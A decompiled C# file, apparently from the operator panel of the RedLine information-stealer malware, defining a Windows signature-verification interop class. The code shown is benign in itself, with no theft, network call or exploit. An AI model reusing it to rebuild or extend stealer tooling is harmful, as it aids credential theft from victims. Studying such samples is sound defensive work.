using System;
using System.Runtime.InteropServices;

namespace RedLine.MainPanel.Data.Helpers;

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
internal class WinTrustData
{
	private uint uint_0 = (uint)Marshal.SizeOf(typeof(WinTrustData));

	private IntPtr intptr_0 = IntPtr.Zero;

	private IntPtr intptr_1 = IntPtr.Zero;

	private WinTrustDataUIChoice winTrustDataUIChoice_0 = WinTrustDataUIChoice.None;

	private WinTrustDataRevocationChecks winTrustDataRevocationChecks_0;

	private WinTrustDataChoice winTrustDataChoice_0 = WinTrustDataChoice.File;

	private IntPtr intptr_2;

	private WinTrustDataStateAction winTrustDataStateAction_0;

	private IntPtr intptr_3 = IntPtr.Zero;

	private string string_0;

	private WinTrustDataProvFlags a = WinTrustDataProvFlags.RevocationCheckChainExcludeRoot;

	private WinTrustDataUIContext b;

	public WinTrustData(WinTrustFileInfo _fileInfo)
	{
		if (Environment.OSVersion.Version.Major > 6 || (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor > 1) || (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor == 1 && !string.IsNullOrEmpty(Environment.OSVersion.ServicePack)))
		{
			a |= WinTrustDataProvFlags.DisableMD2andMD4;
		}
		intptr_2 = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(WinTrustFileInfo)));
		Marshal.StructureToPtr(_fileInfo, intptr_2, fDeleteOld: false);
	}

	public void Dispose()
	{
		if (intptr_2 != IntPtr.Zero)
		{
			Marshal.FreeCoTaskMem(intptr_2);
			intptr_2 = IntPtr.Zero;
		}
	}
}
